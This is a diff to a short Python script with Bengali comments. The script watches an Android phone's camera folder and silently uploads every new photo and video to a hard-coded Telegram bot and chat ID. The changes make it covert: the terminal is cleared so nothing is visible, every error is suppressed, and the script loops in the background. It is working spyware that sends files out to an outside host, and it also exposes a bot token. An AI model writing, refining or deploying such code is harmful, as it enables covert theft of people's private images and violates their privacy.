@@ -2,34 +2,35 @@ import os
 import time
 import requests
 
-# তোমার টেলিগ্রাম বটের টোকেন  
+# টেলিগ্রাম বটের টোকেন  
 BOT_TOKEN = "8031168268:AAHgNwZm4v5z68N9oVU4lKheOo66ysVhwqg"
 
-# তোমার টেলিগ্রাম আইডি (যেখানে ফাইল পাঠাবে)
+# টেলিগ্রাম আইডি (যেখানে ফাইল পাঠাবে)
 CHAT_ID = "7348506103"
 
-# যে ফোল্ডারের ফাইল পাঠাবে (যেমন: /sdcard/DCIM/)
-FOLDER_PATH = "/sdcard/DCIM/"
+# যে ফোল্ডারের ফাইল পাঠাবে
+FOLDER_PATH = "/sdcard/DCIM/Camera"
 
-# আগে পাঠানো ফাইলগুলো ট্র্যাক করার জন্য একটি লিস্ট
+# পাঠানো ফাইল লিস্ট ট্র্যাক করতে
 sent_files = set()
+
+# টার্মিনাল ক্লিয়ার করা যাতে কিছু দেখা না যায়
+os.system("clear")
 
 # ফাইল আপলোড ফাংশন
 def send_file(file_path):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-    with open(file_path, "rb") as file:
-        requests.post(url, data={"chat_id": CHAT_ID}, files={"document": file})
-        print(f"hacking bot: {file_path}")
+    try:
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
+        with open(file_path, "rb") as file:
+            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": file})
+        sent_files.add(file_path)  # পাঠানো ফাইল ট্র্যাক করা
+    except:
+        pass  # কোনো এরর হলেও কিছু দেখাবে না
 
-# লুপ চালু থাকবে
+# ব্যাকগ্রাউন্ডে চালানোর জন্য লুপ
 while True:
-    for root, dirs, files in os.walk(FOLDER_PATH):  
-        for file_name in files:
-            file_path = os.path.join(root, file_name)
-
-            # শুধুমাত্র ছবি ও ভিডিও ফাইল পাঠাবে
-            if file_path.endswith((".jpg", ".jpeg", ".png", ".mp4", ".avi", ".mkv")) and file_path not in sent_files:
-                send_file(file_path)
-                sent_files.add(file_path)
-
-    time.sleep(10)  # প্রতি ১০ সেকেন্ড পর পর চেক করবে
+    for file_name in os.listdir(FOLDER_PATH):
+        file_path = os.path.join(FOLDER_PATH, file_name)
+        if os.path.isfile(file_path) and file_path not in sent_files:
+            send_file(file_path)
+    time.sleep(10)  # প্রতি ১০ সেকেন্ড পর পর নতুন ফাইল চেক করবে
